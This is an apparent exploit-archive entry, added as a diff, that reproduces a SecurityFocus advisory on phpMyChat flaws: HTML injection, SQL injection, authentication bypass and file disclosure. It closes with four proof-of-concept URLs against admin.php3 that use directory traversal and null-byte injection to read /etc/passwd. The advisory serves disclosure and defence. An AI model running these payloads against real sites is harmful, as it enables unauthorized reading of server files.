@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/10556/info
+  
+phpHeaven phpMyChat is reported prone to multiple vulnerabilities. The issues result from insufficient sanitization of user-supplied data and design flaws. The following specific issues can affect the application:
+  
+phpMyChat is prone to a HTML injection vulnerability. The issue affects the 'input.php3' script. Due to a lack of sufficient sanitization of user-supplied data, this HTML Injection vulnerability may permit an attacker to inject malicious HTML or script code into the affected application. Users who are connected to this session would have the attacker supplied HTML code rendered in their browser in the context of the vulnerable site.
+  
+phpMyChat is prone to multiple SQL injection vulnerabilities. Again the issues are due to a failure of the application to properly sanitize user-supplied input. The problem presents itself when SQL syntax is passed through the URI parameters of the 'usersL.php3' script. The offending parameters are used in SQL queries prior to proper sanitization.
+  
+An authentication bypass vulnerability is reported to affect the phpMyChat authentication system. It is reported that by saving and modifying the phpMyChat authentication screen an attacker may potentially bypass the authentication system.
+  
+Finally phpMyChat is reported to be prone to a file disclosure vulnerability. A user who is authenticated as a site administrator can exploit the issue. The vulnerability presents itself because directory traversal sequences are not correctly sanitized from user-supplied data. It is reported that an attacker may disclose a target file by including a relative path including directory traversal sequences to the target file as a value for a URI parameter passed to the 'admin.php3' script.
+
+http://www.example.com/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=[FILE]%00
+http://[www.example.com/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sheet=/../../../../../../etc/passwd%00
+and
+http://www.example.com/chat/admin.php3?From=admin.php3&What=[FILE]%00&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=1
+http://www.example.com/chat/admin.php3?From=admin.php3&What=/../../../../../../etc/passwd%00&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sheet=1
